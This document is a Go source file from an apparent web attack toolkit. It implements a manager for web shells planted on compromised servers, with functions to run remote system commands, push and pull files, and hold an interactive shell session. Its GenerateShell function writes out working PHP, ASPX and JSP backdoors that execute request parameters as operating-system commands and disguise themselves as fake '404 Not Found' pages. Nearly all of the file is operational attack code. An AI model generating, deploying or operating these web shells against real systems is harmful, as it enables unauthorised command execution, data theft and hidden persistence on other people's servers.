package shell

import (
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"net/url"
	"os"
	"strings"
	"time"

	"webattack/pkg/httpclient"

	"github.com/fatih/color"
)

// ShellType represents the type of web shell
type ShellType string

const (
	ShellPHP   ShellType = "php"
	ShellASP   ShellType = "asp"
	ShellASPX  ShellType = "aspx"
	ShellJSP   ShellType = "jsp"
	ShellOther ShellType = "other"
)

// ShellInfo holds information about a web shell
type ShellInfo struct {
	Name      string
	URL       string
	Type      ShellType
	Password  string
	AddedAt   time.Time
	LastCheck time.Time
	Status    string // "active", "dead", "unknown"
}

// Manager manages web shells
type Manager struct {
	client *httpclient.Client
	shells []ShellInfo
}

// NewManager creates a new WebShell manager
func NewManager(client *httpclient.Client) *Manager {
	return &Manager{
		client: client,
		shells: make([]ShellInfo, 0),
	}
}

// AddShell adds a shell to the manager
func (m *Manager) AddShell(name, urlStr, shellType, password string) {
	m.shells = append(m.shells, ShellInfo{
		Name:     name,
		URL:      urlStr,
		Type:     ShellType(shellType),
		Password: password,
		AddedAt:  time.Now(),
		Status:   "unknown",
	})
}

// ListShells lists all registered shells
func (m *Manager) ListShells() []ShellInfo {
	return m.shells
}

// RemoveShell removes a shell by index
func (m *Manager) RemoveShell(index int) error {
	if index < 0 || index >= len(m.shells) {
		return fmt.Errorf("invalid shell index: %d", index)
	}
	m.shells = append(m.shells[:index], m.shells[index+1:]...)
	return nil
}

// CheckShell checks if a shell is still active
func (m *Manager) CheckShell(index int) error {
	if index < 0 || index >= len(m.shells) {
		return fmt.Errorf("invalid shell index: %d", index)
	}

	shell := &m.shells[index]
	resp, err := m.client.Get(shell.URL)
	if err != nil {
		shell.Status = "dead"
		shell.LastCheck = time.Now()
		return fmt.Errorf("shell unreachable: %v", err)
	}

	if resp.StatusCode == 200 {
		shell.Status = "active"
	} else {
		shell.Status = fmt.Sprintf("http_%d", resp.StatusCode)
	}
	shell.LastCheck = time.Now()
	return nil
}

// CheckAll checks all shells
func (m *Manager) CheckAll() {
	color.Cyan("\n[*] Checking all shells...\n")
	for i := range m.shells {
		fmt.Printf("[%d] %s (%s) ... ", i, m.shells[i].Name, m.shells[i].URL)
		if err := m.CheckShell(i); err != nil {
			color.Red("DEAD - %v", err)
		} else {
			color.Green("ACTIVE")
		}
	}
}

// ExecuteCommand executes a command on a shell
func (m *Manager) ExecuteCommand(index int, cmd string) (string, error) {
	if index < 0 || index >= len(m.shells) {
		return "", fmt.Errorf("invalid shell index: %d", index)
	}

	shell := &m.shells[index]

	switch shell.Type {
	case ShellPHP:
		phpCmd := fmt.Sprintf("system('%s');", strings.ReplaceAll(cmd, "'", "\\'"))
		queryURL := fmt.Sprintf("%s?%s=%s", shell.URL, shell.Password, url.QueryEscape(phpCmd))
		resp, err := m.client.Get(queryURL)
		if err != nil {
			return "", err
		}
		return string(resp.Body), nil

	case ShellASP, ShellASPX:
		resp, err := m.client.Get(fmt.Sprintf("%s?%s=%s",
			shell.URL, shell.Password,
			url.QueryEscape(cmd)))
		if err != nil {
			return "", err
		}
		return string(resp.Body), nil

	case ShellJSP:
		resp, err := m.client.Post(fmt.Sprintf("%s?%s=%s",
			shell.URL, shell.Password,
			url.QueryEscape(cmd)), "")
		if err != nil {
			return "", err
		}
		return string(resp.Body), nil

	default:
		form := url.Values{}
		form.Set(shell.Password, cmd)
		form.Set("cmd", cmd)
		resp, err := m.client.PostForm(shell.URL, form)
		if err != nil {
			return "", err
		}
		return string(resp.Body), nil
	}
}

// UploadFile uploads a file via the shell
func (m *Manager) UploadFile(index int, localPath, remotePath string) error {
	if index < 0 || index >= len(m.shells) {
		return fmt.Errorf("invalid shell index: %d", index)
	}

	data, err := os.ReadFile(localPath)
	if err != nil {
		return fmt.Errorf("failed to read file: %v", err)
	}

	shell := &m.shells[index]

	switch shell.Type {
	case ShellPHP:
		encoded := base64.StdEncoding.EncodeToString(data)
		cmd := fmt.Sprintf("file_put_contents('%s', base64_decode('%s'));",
			strings.ReplaceAll(remotePath, "'", "\\'"), encoded)

		resp, err := m.client.Get(fmt.Sprintf("%s?%s=%s",
			shell.URL, shell.Password, url.QueryEscape(cmd)))
		if err != nil {
			return err
		}
		fmt.Printf("    Response: %s\n", string(resp.Body))
		return nil

	default:
		return fmt.Errorf("file upload not supported for shell type: %s", shell.Type)
	}
}

// DownloadFile downloads a file via the shell
func (m *Manager) DownloadFile(index int, remotePath, localPath string) error {
	if index < 0 || index >= len(m.shells) {
		return fmt.Errorf("invalid shell index: %d", index)
	}

	shell := &m.shells[index]

	switch shell.Type {
	case ShellPHP:
		cmd := fmt.Sprintf("echo base64_encode(file_get_contents('%s'));",
			strings.ReplaceAll(remotePath, "'", "\\'"))

		resp, err := m.client.Get(fmt.Sprintf("%s?%s=%s",
			shell.URL, shell.Password, url.QueryEscape(cmd)))
		if err != nil {
			return err
		}

		body := strings.TrimSpace(string(resp.Body))
		data, err := base64.StdEncoding.DecodeString(body)
		if err != nil {
			return fmt.Errorf("failed to decode response: %v", err)
		}

		return os.WriteFile(localPath, data, 0644)

	default:
		return fmt.Errorf("file download not supported for shell type: %s", shell.Type)
	}
}

// PrintShells prints all shells in a formatted table
func PrintShells(shells []ShellInfo) {
	if len(shells) == 0 {
		color.Yellow("[!] No shells registered.")
		return
	}

	color.Cyan("\n╔══════════════════════════════════════════════════════════════════════════════╗")
	color.Cyan("║                            WEB SHELL MANAGER                               ║")
	color.Cyan("╚══════════════════════════════════════════════════════════════════════════════╝\n")

	fmt.Printf("  %-3s %-15s %-40s %-8s %-10s %-8s\n",
		"ID", "Name", "URL", "Type", "Status", "Age")
	fmt.Printf("  %-3s %-15s %-40s %-8s %-10s %-8s\n",
		"---", "-----", "---", "----", "------", "---")

	for i, s := range shells {
		age := time.Since(s.AddedAt).Round(time.Minute).String()
		statusColor := color.GreenString
		switch s.Status {
		case "dead":
			statusColor = color.RedString
		case "unknown":
			statusColor = color.YellowString
		}

		fmt.Printf("  %-3d %-15s %-40s %-8s %-10s %-8s\n",
			i,
			truncateStr(s.Name, 15),
			truncateStr(s.URL, 40),
			s.Type,
			statusColor(s.Status),
			age,
		)
	}
	fmt.Println()
}

func truncateStr(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen-3] + "..."
}

// GenerateShell generates a simple web shell code
func GenerateShell(shellType ShellType, password string) string {
	switch shellType {
	case ShellPHP:
		return fmt.Sprintf(`<?php
if(isset($_REQUEST['%s'])) {
    echo "<pre>";
    system($_REQUEST['%s']);
    echo "</pre>";
    die();
}
?>
<!DOCTYPE html>
<html><head><title>404 Not Found</title></head>
<body><h1>Not Found</h1></body></html>`, password, password)

	case ShellASPX:
		return fmt.Sprintf(`<%@ Page Language="C#" %>
<!DOCTYPE html><html><head><title>404</title></head><body>
<%% if(Request["%s"] != null) {
    Response.Write(System.Diagnostics.Process.Start(
        "cmd.exe", "/c "+Request["%s"]).StandardOutput.ReadToEnd());
} %%>
<h1>Not Found</h1></body></html>`, password, password)

	case ShellJSP:
		return fmt.Sprintf(`<%@ page import="java.util.*,java.io.*" %>
<%% String cmd = request.getParameter("%s");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader in = new BufferedReader(
        new InputStreamReader(p.getInputStream()));
    String line;
    while((line = in.readLine()) != null) out.println(line);
    return;
} %%>
<html><head><title>404</title></head><body><h1>Not Found</h1></body></html>`, password)

	default:
		return fmt.Sprintf("// Shell generation for %s not implemented", shellType)
	}
}

// SaveShellToFile generates a shell and saves it to a file
func SaveShellToFile(filepath string, shellType ShellType, password string) error {
	code := GenerateShell(shellType, password)
	return os.WriteFile(filepath, []byte(code), 0644)
}

// InteractiveShell provides an interactive shell session
func InteractiveShell(m *Manager, index int) error {
	if index < 0 || index >= len(m.shells) {
		return fmt.Errorf("invalid shell index: %d", index)
	}

	shell := &m.shells[index]

	color.Cyan("\n[*] Connecting to %s (%s)...\n", shell.Name, shell.URL)
	color.Green("[+] Connection established. Type 'exit' to quit, 'help' for commands.\n")

	currentDir := ""
	buffer := make([]byte, 4096)

	for {
		prompt := fmt.Sprintf("%s@shell> ", shell.Name)
		if currentDir != "" {
			prompt = fmt.Sprintf("%s@shell:%s> ", shell.Name, currentDir)
		}
		fmt.Print(prompt)

		n, err := os.Stdin.Read(buffer)
		if err != nil {
			if err == io.EOF {
				fmt.Println()
				break
			}
			continue
		}

		input := strings.TrimSpace(string(buffer[:n]))
		parts := strings.Fields(input)
		if len(parts) == 0 {
			continue
		}

		cmd := parts[0]

		switch strings.ToLower(cmd) {
		case "exit", "quit":
			fmt.Println("[*] Disconnecting...")
			return nil

		case "help":
			fmt.Println("Commands:")
			fmt.Println("  help          - Show this help")
			fmt.Println("  exit/quit     - Disconnect")
			fmt.Println("  cmd <command> - Execute system command")
			fmt.Println("  pwd           - Print working directory")
			fmt.Println("  cd <dir>      - Change directory")
			fmt.Println("  upload <l> <r> - Upload a file")
			fmt.Println("  download <r> <l> - Download a file")
			fmt.Println("  clear         - Clear screen")

		case "clear":
			fmt.Print("\033[2J\033[H")

		case "cmd":
			if len(parts) < 2 {
				fmt.Println("Usage: cmd <command>")
				continue
			}
			sysCmd := strings.Join(parts[1:], " ")
			output, err := m.ExecuteCommand(index, sysCmd)
			if err != nil {
				color.Red("Error: %v\n", err)
			} else {
				fmt.Println(output)
			}

		case "pwd":
			if currentDir == "" {
				output, err := m.ExecuteCommand(index, "pwd")
				if err == nil {
					currentDir = strings.TrimSpace(output)
				}
			}
			fmt.Println(currentDir)

		case "cd":
			if len(parts) < 2 {
				fmt.Println("Usage: cd <directory>")
				continue
			}
			newDir := parts[1]
			output, err := m.ExecuteCommand(index, "cd "+newDir+" && pwd")
			if err != nil {
				color.Red("Error: %v\n", err)
			} else {
				currentDir = strings.TrimSpace(output)
			}

		case "upload":
			if len(parts) < 3 {
				fmt.Println("Usage: upload <local_path> <remote_path>")
				continue
			}
			if err := m.UploadFile(index, parts[1], parts[2]); err != nil {
				color.Red("Upload failed: %v\n", err)
			} else {
				color.Green("Upload successful!\n")
			}

		case "download":
			if len(parts) < 3 {
				fmt.Println("Usage: download <remote_path> <local_path>")
				continue
			}
			if err := m.DownloadFile(index, parts[1], parts[2]); err != nil {
				color.Red("Download failed: %v\n", err)
			} else {
				color.Green("Download successful!\n")
			}

		default:
			output, err := m.ExecuteCommand(index, input)
			if err != nil {
				color.Red("Error: %v\n", err)
			} else {
				fmt.Println(output)
			}
		}
	}
	return nil
}

// Ensure packages are used
var _ = md5.Sum
var _ = hex.EncodeToString
var _ = io.EOF
var _ = fmt.Sprintf
